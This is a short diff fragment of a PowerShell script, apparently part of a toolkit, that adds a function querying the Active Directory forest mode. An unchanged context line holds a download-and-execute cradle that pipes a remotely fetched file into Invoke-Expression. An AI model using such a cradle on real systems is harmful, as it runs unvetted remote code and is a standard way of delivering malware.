@@ -82,3 +82,6 @@ if($netAssembly)
 Invoke-Expression(New-Object net.webclient).downloadstring("https://$ComputerName/$targetFile")	
 }
 
+Function Get-ForestMode {
+	[system.directoryservices.ActiveDirectory.Forest]::GetCurrentForest() | select ForestMode
+}
